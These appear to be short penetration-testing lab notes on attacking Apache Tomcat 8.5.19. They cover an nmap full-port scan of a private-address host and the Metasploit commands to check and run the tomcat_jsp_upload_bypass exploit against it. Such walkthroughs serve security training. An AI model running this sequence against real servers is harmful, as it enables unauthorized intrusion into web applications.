### Apache Tomcat Exploitation

---

### Apache vs Apache Tomcat :

- Apache >> static and Dynamic Website / Applications (typically PHP)
- Apache Tomcat >> primarily used for dynamic websites or Web application developed in Java. 

##### Scan Port (TomCat doesn't belong to common port scanned by nmap)

> - nmap --top-ports 65536 10.0.0.141

*Tomcat apache found on port 8080, version 8.5.19 found*

##### Check on google if this version is vulnerable, and check for exploit

##### Exploiting the target server using metasploit tomcat_jsp_upload_bypass module

> - msfconsole
> - use exploit/multi/http/tomcat_jsp_upload_bypass
> - set RHOSTS 10.0.0.141
> - check 

*We are running a “check” command in the metasploit framework to make sure that if the target is vulnerable to jsp_upload_bypass or not*

> - exploit
